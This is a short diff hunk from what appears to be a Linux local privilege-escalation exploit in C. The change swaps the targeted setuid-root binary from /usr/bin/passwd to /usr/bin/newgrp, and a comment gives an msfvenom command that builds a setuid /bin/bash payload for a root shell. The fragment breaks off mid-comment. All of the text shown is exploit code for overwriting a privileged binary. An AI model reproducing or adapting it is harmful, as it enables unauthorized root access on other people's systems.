@@ -36,7 +36,7 @@ pthread_t pth;
 struct stat st;
 
 // change if no permissions to read
-char suid_binary[] = "/usr/bin/passwd";
+char suid_binary[] = "/usr/bin/newgrp";
 
 /*
 * $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
